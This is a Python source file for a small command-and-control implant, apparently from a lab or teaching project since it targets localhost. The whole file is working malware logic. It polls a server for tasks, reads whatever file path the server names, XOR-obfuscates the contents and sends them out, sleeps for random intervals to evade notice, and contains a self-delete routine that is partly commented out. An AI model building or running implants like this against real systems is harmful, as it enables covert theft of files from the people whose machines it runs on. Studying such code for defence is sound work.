import requests
import time
import random
import sys
import os

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from obfuscation import obfuscate_payload

UUID = "implant2"
SERVER = "http://localhost:8000"

xor_key = "secret_key"

def destroy():
    try:
      
      requests.post(f"{SERVER}/destroy", json = {"status":"dead"})
      
    except Exception as e:
        print("Could not notify server of destroy")
    
    cur_path = os.path.abspath(__file__)
    #os.remove(cur_path)
    print("Destroying ...")

num_errors = 0
alive = True
while alive:
    try:
        res = requests.post(f"{SERVER}/get_task", json={"uuid": UUID})
        task = res.json()
        print(task)
        if task["task"] == "get_file":
            print("Trying task")
            print(task["parameters"]["path"])
            path = task["parameters"]["path"]
            try:
                with open(path, "r") as f:
                    contents = f.read()
                payload = {"data": contents}
                payload = obfuscate_payload(payload, xor_key)
                requests.post(f"{SERVER}/submit_data", json=payload)
            except Exception as e:
                print(f"Error reading file: {e}")
        elif task["task"] == 'destroy':
            destroy()
            alive = False # simulates os.remove(file)
        elif task["task"] == "none":
            print("[-] No task. Sleeping.")
    except Exception as e:
        num_errors += 1
        print(f"Error {num_errors} Reaching Server:")
        print()
        print(f"Error: {e}")
        print()
        if num_errors >= 5:
            print("Could not Reach Server")
            destroy()
            alive = False
    time.sleep(random.randint(10, 30)) #ping server randomly